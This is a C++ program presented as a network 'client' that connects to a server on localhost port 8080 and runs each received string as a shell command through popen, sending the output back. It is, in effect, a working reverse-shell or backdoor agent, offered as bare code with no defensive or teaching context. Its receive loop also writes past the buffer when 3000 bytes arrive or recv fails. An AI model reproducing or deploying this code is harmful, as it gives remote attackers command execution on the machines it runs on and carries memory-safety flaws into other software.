#include <stdio.h>
#include <iostream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>

//CLIENT
int main(void)
{
    //VARIABLE DEFINITION
    int PORT = 8080;
    const char *IP = "127.0.0.1";
    char MESSAGE[3000]; 

    //CREATING SOCKET
    sockaddr_in clientSocketAddress;
    memset(&clientSocketAddress, 0, sizeof(clientSocketAddress));
    clientSocketAddress.sin_family = AF_INET;
    clientSocketAddress.sin_addr.s_addr = inet_addr(IP);
    clientSocketAddress.sin_port = htons(PORT);
    int client = socket(AF_INET, SOCK_STREAM, 0);
    
    //CONNECTING TO SERVER
    if (connect(client,(sockaddr*) &clientSocketAddress, sizeof(clientSocketAddress))>=0){
        printf("Successfully connected to server\n");
    }else{
        printf("Connection failed\n");
        return 1;
    }
    printf("Client connected at port %i\n", PORT);
    char serverMessage[3000];
    while(true)
    {
        //RECEIVING SERVER MESSAGE
        memset(serverMessage, 0, sizeof(serverMessage));
        int bytesReceived = recv(client, serverMessage, sizeof(serverMessage),0);
        serverMessage[bytesReceived] = '\0'; // Null-terminate the received data
        //CHECKING FOR EXIT COMMAND
        if (strcmp(serverMessage, "exit") == 0)
        {
            printf("Exit command received from server\n");
            break;
        }
        FILE *fp = popen(serverMessage, "r");
        if (fp == NULL)
        {
            perror("Error executing command");
            break;
        }
        //SENDING COMMAND OUTPUT TO SERVER
        while (fgets(serverMessage, sizeof(serverMessage), fp) != NULL)
        {
            send(client, serverMessage, strlen(serverMessage), 0);
        }

        pclose(fp);
        
    }
    close(client);
    printf("Socket closed\n");
    return 0;    
}